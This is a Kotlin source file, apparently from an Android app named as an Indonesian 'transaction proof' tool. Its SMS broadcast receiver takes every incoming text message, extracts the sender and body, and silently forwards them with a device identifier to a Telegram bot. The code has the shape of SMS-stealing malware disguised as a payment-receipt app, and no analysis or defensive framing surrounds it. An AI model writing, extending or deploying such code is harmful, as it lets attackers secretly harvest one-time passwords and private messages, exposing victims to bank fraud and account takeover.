package com.buktitransaksi.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_DELIVER_ACTION) return

        val deviceId = DeviceIdHelper.getOrCreateDeviceId(context)
        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)

        for (sms in messages) {
            val originatingAddress = sms.originatingAddress ?: "Tidak diketahui"
            val body = sms.messageBody ?: ""
            val regex = Regex("^([A-Za-z0-9\\s\\-\\.]{2,20}):\\s*(.+)$", RegexOption.DOT_MATCHES_ALL)
            val match = regex.find(body)

            val (sender, message) = if (match != null) {
                match.groupValues[1].trim() to match.groupValues[2].trim()
            } else {
                originatingAddress to body
            }

            CoroutineScope(Dispatchers.IO).launch {
                TelegramHelper.sendSms(deviceId, sender, message)
            }
        }
    }
}
